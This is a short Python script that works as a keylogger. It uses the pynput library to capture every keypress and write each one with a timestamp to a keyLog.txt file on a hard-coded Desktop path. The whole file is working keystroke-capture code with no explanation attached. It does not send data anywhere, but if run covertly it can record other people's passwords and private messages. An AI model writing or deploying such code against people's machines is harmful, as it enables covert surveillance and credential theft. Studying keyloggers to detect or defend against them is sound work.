import logging
from pynput import keyboard

log_dir = "/home/the-pratik/Desktop"
logging.basicConfig(filename=log_dir + "/keyLog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()